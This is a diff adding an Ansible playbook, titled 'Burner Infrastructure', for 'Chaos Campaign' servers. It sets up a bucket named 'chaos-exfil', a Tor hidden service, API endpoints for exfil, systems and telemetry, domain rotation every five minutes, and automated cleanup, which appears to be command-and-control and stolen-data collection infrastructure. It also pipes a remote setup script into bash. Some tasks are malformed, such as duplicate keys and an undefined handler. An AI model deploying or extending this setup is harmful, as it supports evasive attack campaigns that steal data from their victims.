@@ -1,0 +1,570 @@
+---
+# Burner Infrastructure - Ansible Playbook
+# Deploys and configures campaign infrastructure
+
+- name: Deploy Chaos Campaign Infrastructure
+  hosts: all
+  become: yes
+  vars:
+    campaign_id: "{{ campaign_id | default('campaign_001') }}"
+    campaign_name: "{{ campaign_name | default('Chaos Campaign') }}"
+    vercel_token: "{{ vercel_token }}"
+    aws_region: "{{ aws_region | default('us-east-1') }}"
+    cloudflare_token: "{{ cloudflare_token }}"
+    cloudflare_zone_id: "{{ cloudflare_zone_id }}"
+    notification_webhook: "{{ notification_webhook | default('') }}"
+    
+  roles:
+    - role: common
+    - role: docker
+    - role: tor
+    - role: nginx
+    - role: monitoring
+    - role: hardening
+
+  tasks:
+    - name: Set campaign facts
+      set_fact:
+        project_name: "chaos-{{ campaign_id }}"
+        s3_bucket_name: "chaos-exfil-{{ campaign_id }}"
+        kv_namespace: "chaos-{{ campaign_id }}"
+
+    - name: Create campaign directory structure
+      file:
+        path: "{{ item }}"
+        state: directory
+        mode: '0755'
+      loop:
+        - "/opt/chaos/{{ campaign_id }}"
+        - "/opt/chaos/{{ campaign_id }}/config"
+        - "/opt/chaos/{{ campaign_id }}/scripts"
+        - "/opt/chaos/{{ campaign_id }}/logs"
+        - "/opt/chaos/{{ campaign_id }}/data"
+        - "/var/lib/tor/hidden_{{ campaign_id }}"
+
+    - name: Deploy campaign configuration
+      template:
+        src: "campaign.env.j2"
+        dest: "/opt/chaos/{{ campaign_id }}/config/campaign.env"
+        mode: '0600'
+      vars:
+        master_api_key: "sk_{{ campaign_id }}_{{ lookup('password', '/dev/null chars=ascii_letters length=32') }}"
+        kv_url: "https://{{ kv_namespace }}.kv.vercel-storage.com"
+        kv_token: "{{ lookup('password', '/dev/null chars=ascii_letters length=64') }}"
+        exfil_server_url: "https://{{ campaign_id }}.example.com"
+        r2_account_id: "{{ r2_account_id | default('') }}"
+        r2_access_key: "{{ r2_access_key | default('') }}"
+        r2_secret_key: "{{ r2_secret_key | default('') }}"
+        r2_bucket: "{{ s3_bucket_name }}"
+
+    - name: Deploy Docker Compose
+      template:
+        src: "docker-compose.yml.j2"
+        dest: "/opt/chaos/{{ campaign_id }}/docker-compose.yml"
+        mode: '0644'
+
+    - name: Deploy Tor configuration
+      template:
+        src: "torrc.j2"
+        dest: "/etc/tor/torrc_{{ campaign_id }}"
+        mode: '0644'
+      notify: restart tor
+
+    - name: Deploy Nginx configuration
+      template:
+        src: "nginx.conf.j2"
+        dest: "/etc/nginx/sites-available/chaos-{{ campaign_id }}"
+        mode: '0644'
+      notify: reload nginx
+
+    - name: Enable Nginx site
+      file:
+        src: "/etc/nginx/sites-available/chaos-{{ campaign_id }}"
+        dest: "/etc/nginx/sites-enabled/chaos-{{ campaign_id }}"
+        state: link
+      notify: reload nginx
+
+    - name: Deploy systemd services
+      template:
+        src: "{{ item.src }}"
+        dest: "{{ item.dest }}"
+        mode: '0644'
+      loop:
+        - { src: "tor@.service.j2", dest: "/etc/systemd/system/tor@.service" }
+        - { src: "chaos-cleanup.service.j2", dest: "/etc/systemd/system/chaos-cleanup-{{ campaign_id }}.service" }
+        - { src: "chaos-cleanup.timer.j2", dest: "/etc/systemd/system/chaos-cleanup-{{ campaign_id }}.timer" }
+      notify: daemon_reload
+
+    - name: Deploy cleanup script
+      template:
+        src: "cleanup.py.j2"
+        dest: "/opt/chaos/{{ campaign_id }}/scripts/cleanup.py"
+        mode: '0755'
+
+    - name: Deploy rotation script
+      template:
+        src: "rotate_domains.sh.j2"
+        dest: "/opt/chaos/{{ campaign_id }}/scripts/rotate_domains.sh"
+        mode: '0755'
+
+    - name: Deploy monitoring script
+      template:
+        src: "monitor.py.j2"
+        dest: "/opt/chaos/{{ campaign_id }}/scripts/monitor.py"
+        mode: '0755'
+
+    - name: Start and enable services
+      systemd:
+        name: "{{ item }}"
+        enabled: yes
+        state: started
+      loop:
+        - "tor@{{ campaign_id }}"
+        - "chaos-cleanup-{{ campaign_id }}.timer"
+        - "nginx"
+      ignore_errors: yes
+
+    - name: Start Docker Compose
+      community.docker.docker_compose_v2:
+        project_src: "/opt/chaos/{{ campaign_id }}"
+        state: present
+      register: docker_result
+
+    - name: Wait for services to be healthy
+      uri:
+        url: "http://localhost:3000/api/health"
+        method: GET
+        status_code: 200
+      register: health_check
+      until: health_check.status == 200
+      retries: 30
+      delay: 10
+      ignore_errors: yes
+
+    - name: Configure logrotate
+      template:
+        src: "logrotate.j2"
+        dest: "/etc/logrotate.d/chaos-{{ campaign_id }}"
+        mode: '0644'
+
+    - name: Setup cron for domain rotation
+      cron:
+        name: "chaos-domain-rotation-{{ campaign_id }}"
+        minute: "*/5"
+        job: "/opt/chaos/{{ campaign_id }}/scripts/rotate_domains.sh >> /opt/chaos/{{ campaign_id }}/logs/rotate.log 2>&1"
+        user: root
+
+    - name: Send deployment notification
+      uri:
+        url: "{{ notification_webhook }}"
+        method: POST
+        body_format: json
+        body:
+          text: "✅ Campaign {{ campaign_name }} ({{ campaign_id }}) deployed successfully"
+          blocks:
+            - type: section
+              text:
+                type: mrkdwn
+                text: "*Campaign:* {{ campaign_name }}\n*ID:* {{ campaign_id }}\n*Dashboard:* https://{{ campaign_id }}.example.com/dashboard\n*Onion:* http://{{ campaign_id }}.onion/dashboard\n*API:* https://{{ campaign_id }}.example.com/api/v2"
+        headers:
+          Content-Type: application/json
+      when: notification_webhook != ""
+      ignore_errors: yes
+
+    - name: Output deployment info
+      debug:
+        msg:
+          - "Campaign: {{ campaign_name }} ({{ campaign_id }})"
+          - "Dashboard: https://{{ campaign_id }}.example.com/dashboard"
+          - "Onion: http://{{ campaign_id }}.onion/dashboard"
+          - "API: https://{{ campaign_id }}.example.com/api/v2"
+          - "Exfil: https://{{ campaign_id }}.example.com/api/v2/exfil"
+          - "Systems: https://{{ campaign_id }}.example.com/api/v2/systems"
+          - "Stats: https://{{ campaign_id }}.example.com/api/v2/stats"
+          - "Telemetry: https://{{ campaign_id }}.example.com/api/v2/telemetry"
+
+  handlers:
+    - name: restart tor
+      systemd:
+        name: "tor@{{ campaign_id }}"
+        state: restarted
+        enabled: yes
+
+    - name: reload nginx
+      systemd:
+        name: nginx
+        state: reloaded
+
+    - name: daemon_reload
+      systemd:
+        daemon_reload: yes
+
+# =============================================================================
+# ROLES
+# =============================================================================
+
+# roles/common/tasks/main.yml
+- name: Update package cache
+  apt:
+    update_cache: yes
+    cache_valid_time: 3600
+
+- name: Install base packages
+  apt:
+    name:
+      - curl
+      - wget
+      - gnupg2
+      - software-properties-common
+      - apt-transport-https
+      - ca-certificates
+      - lsb-release
+      - python3
+      - python3-pip
+      - python3-venv
+      - jq
+      - git
+      - htop
+      - vim
+      - tmux
+      - net-tools
+      - dnsutils
+      - iputils-ping
+      - tcpdump
+      - nmap
+      - wireshark-common
+      - sqlite3
+      - postgresql-client
+      - redis-tools
+    state: present
+
+- name: Install Docker
+  block:
+    - name: Add Docker GPG key
+      apt_key:
+        url: https://download.docker.com/linux/ubuntu/gpg
+        state: present
+
+    - name: Add Docker repository
+      apt_repository:
+        repo: "deb [arch=amd64] https://download.docker.com/linux/ubuntu {{ ansible_distribution_release }} stable"
+        state: present
+
+    - name: Install Docker
+      apt:
+        name:
+          - docker-ce
+          - docker-ce-cli
+          - containerd.io
+          - docker-compose-plugin
+        state: present
+        update_cache: yes
+
+    - name: Add user to docker group
+      user:
+        name: "{{ ansible_user }}"
+        groups: docker
+        append: yes
+
+- name: Install Node.js (for Vercel CLI)
+  block:
+    - name: Add NodeSource repository
+      shell: curl -fsSL https://deb.nodesource.com/setup_20.x | bash -
+      args:
+        executable: /bin/bash
+
+    - name: Install Node.js
+      apt:
+        name: nodejs
+        state: present
+
+    - name: Install Vercel CLI
+      npm:
+        name: vercel
+        global: yes
+
+- name: Install AWS CLI
+  block:
+    - name: Download AWS CLI v2
+      get_url:
+        url: "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip"
+        dest: "/tmp/awscliv2.zip"
+
+    - name: Unzip AWS CLI
+      unarchive:
+        src: "/tmp/awscliv2.zip"
+        dest: "/tmp"
+        remote_src: yes
+
+    - name: Install AWS CLI
+      command: /tmp/aws/install
+
+    - name: Cleanup
+      file:
+        path: "/tmp/awscliv2.zip"
+        state: absent
+
+- name: Install Google Cloud SDK
+  block:
+    - name: Add Google Cloud GPG key
+      apt_key:
+        url: https://packages.cloud.google.com/apt/doc/apt-key.gpg
+        state: present
+
+    - name: Add Google Cloud repository
+      apt_repository:
+        repo: "deb [signed-by=/usr/share/keyrings/cloud.google.gpg] https://packages.cloud.google.com/apt cloud-sdk main"
+        state: present
+
+    - name: Install Google Cloud SDK
+      apt:
+        name: google-cloud-sdk
+        state: present
+        update_cache: yes
+
+- name: Configure timezone
+  timezone:
+    name: UTC
+
+- name: Harden SSH
+  lineinfile:
+    path: /etc/ssh/sshd_config
+    regexp: "{{ item.regexp }}"
+    line: "{{ item.line }}"
+  loop:
+    - { regexp: '^#?PermitRootLogin', line: 'PermitRootLogin no' }
+    - { regexp: '^#?PasswordAuthentication', line: 'PasswordAuthentication no' }
+    - { regexp: '^#?PubkeyAuthentication', line: 'PubkeyAuthentication yes' }
+    - { regexp: '^#?PermitEmptyPasswords', line: 'PermitEmptyPasswords no' }
+    - { regexp: '^#?MaxAuthTries', line: 'MaxAuthTries 3' }
+    - { regexp: '^#?ClientAliveInterval', line: 'ClientAliveInterval 300' }
+    - { regexp: '^#?ClientAliveCountMax', line: 'ClientAliveCountMax 2' }
+  notify: restart ssh
+
+# roles/docker/tasks/main.yml
+- name: Create Docker networks
+  community.docker.docker_network:
+    name: "{{ item }}"
+    driver: bridge
+  loop:
+    - chaos-network
+    - chaos-monitoring
+
+- name: Pull base images
+  community.docker.docker_image:
+    name: "{{ item }}"
+    source: pull
+  loop:
+    - peterdavehello/tor:latest
+    - nginx:alpine
+    - prom/prometheus:latest
+    - grafana/grafana:latest
+    - redis:alpine
+    - postgres:15-alpine
+
+# roles/tor/tasks/main.yml
+- name: Install Tor
+  apt:
+    name: tor
+    state: present
+    update_cache: yes
+
+- name: Create Tor user and directories
+  block:
+    - name: Create tor user
+      user:
+        name: tor
+        system: yes
+        shell: /bin/false
+        home: /var/lib/tor
+
+    - name: Create hidden service directories
+      file:
+        path: "/var/lib/tor/hidden_{{ campaign_id }}"
+        state: directory
+        owner: tor
+        group: tor
+        mode: '0700'
+
+    - name: Set permissions on torrc
+      file:
+        path: "/etc/tor/torrc_{{ campaign_id }}"
+        owner: tor
+        group: tor
+        mode: '0640'
+
+- name: Configure Tor for systemd
+  template:
+    src: "tor@.service.j2"
+    dest: "/etc/systemd/system/tor@.service"
+    mode: '0644'
+  notify: daemon_reload
+
+# roles/nginx/tasks/main.yml
+- name: Install Nginx
+  apt:
+    name: nginx
+    state: present
+    update_cache: yes
+
+- name: Remove default site
+  file:
+    path: /etc/nginx/sites-enabled/default
+    state: absent
+
+- name: Create Nginx directories
+  file:
+    path: "{{ item }}"
+    state: directory
+    mode: '0755'
+  loop:
+    - /var/www/chaos
+    - /var/log/nginx/chaos
+
+- name: Generate SSL certificates (self-signed for onion)
+  command: >
+    openssl req -x509 -nodes -days 365 -newkey rsa:2048
+    -keyout /etc/ssl/private/chaos-{{ campaign_id }}.key
+    -out /etc/ssl/certs/chaos-{{ campaign_id }}.crt
+    -subj "/CN={{ campaign_id }}.onion"
+  args:
+    creates: /etc/ssl/certs/chaos-{{ campaign_id }}.crt
+
+# roles/monitoring/tasks/main.yml
+- name: Create Prometheus config
+  template:
+    src: "prometheus.yml.j2"
+    dest: "/opt/chaos/{{ campaign_id }}/config/prometheus.yml"
+    mode: '0644'
+
+- name: Create Grafana dashboards
+  template:
+    src: "grafana-dashboard.json.j2"
+    dest: "/opt/chaos/{{ campaign_id }}/config/grafana-dashboard.json"
+    mode: '0644'
+
+- name: Deploy monitoring stack
+  community.docker.docker_compose_v2:
+    project_src: "/opt/chaos/{{ campaign_id }}"
+    files:
+      - "docker-compose.monitoring.yml"
+    state: present
+
+# roles/hardening/tasks/main.yml
+- name: Configure UFW firewall
+  block:
+    - name: Install UFW
+      apt:
+        name: ufw
+        state: present
+
+    - name: Configure default policies
+      ufw:
+        direction: incoming
+        policy: deny
+      ufw:
+        direction: outgoing
+        policy: allow
+
+    - name: Allow SSH
+      ufw:
+        rule: allow
+        port: 22
+        proto: tcp
+
+    - name: Allow HTTP/HTTPS
+      ufw:
+        rule: allow
+        port: "{{ item }}"
+        proto: tcp
+      loop:
+        - 80
+        - 443
+
+    - name: Allow Tor control port (localhost only)
+      ufw:
+        rule: allow
+        port: 9051
+        proto: tcp
+        interface: lo
+
+    - name: Enable UFW
+      ufw:
+        state: enabled
+
+- name: Configure fail2ban
+  block:
+    - name: Install fail2ban
+      apt:
+        name: fail2ban
+        state: present
+
+    - name: Configure fail2ban
+      template:
+        src: "jail.local.j2"
+        dest: "/etc/fail2ban/jail.local"
+        mode: '0644'
+      notify: restart fail2ban
+
+- name: Configure auditd
+  block:
+    - name: Install auditd
+      apt:
+        name: auditd
+        state: present
+
+    - name: Configure audit rules
+      template:
+        src: "audit.rules.j2"
+        dest: "/etc/audit/rules.d/chaos.rules"
+        mode: '0644'
+      notify: restart auditd
+
+- name: Kernel hardening
+  sysctl:
+    name: "{{ item.name }}"
+    value: "{{ item.value }}"
+    state: present
+    sysctl_set: yes
+  loop:
+    - { name: 'kernel.dmesg_restrict', value: '1' }
+    - { name: 'kernel.kptr_restrict', value: '2' }
+    - { name: 'kernel.yama.ptrace_scope', value: '3' }
+    - { name: 'net.ipv4.conf.all.rp_filter', value: '1' }
+    - { name: 'net.ipv4.conf.default.rp_filter', value: '1' }
+    - { name: 'net.ipv4.icmp_echo_ignore_broadcasts', value: '1' }
+    - { name: 'net.ipv4.icmp_ignore_bogus_error_responses', value: '1' }
+    - { name: 'net.ipv4.conf.all.accept_redirects', value: '0' }
+    - { name: 'net.ipv4.conf.default.accept_redirects', value: '0' }
+    - { name: 'net.ipv4.conf.all.send_redirects', value: '0' }
+    - { name: 'net.ipv6.conf.all.accept_redirects', value: '0' }
+    - { name: 'net.ipv6.conf.default.accept_redirects', value: '0' }
+    - { name: 'fs.protected_hardlinks', value: '1' }
+    - { name: 'fs.protected_symlinks', value: '1' }
+    - { name: 'kernel.unprivileged_bpf_disabled', value: '1' }
+
+- name: Remove unnecessary packages
+  apt:
+    name:
+      - snapd
+      - popularity-contest
+      - apport
+      - whoopsie
+    state: absent
+    purge: yes
+    autoremove: yes
+
+- name: Disable unused filesystems
+  lineinfile:
+    path: /etc/modprobe.d/blacklist-filesystems.conf
+    line: "{{ item }}"
+    create: yes
+  loop:
+    - "install cramfs /bin/true"
+    - "install freevxfs /bin/true"
+    - "install jffs2 /bin/true"
+    - "install hfs /bin/true"
+    - "install hfsplus /bin/true"
+    - "install squashfs /bin/true"
+    - "install udf /bin/true"
+    - "install bluetooth /bin/true"
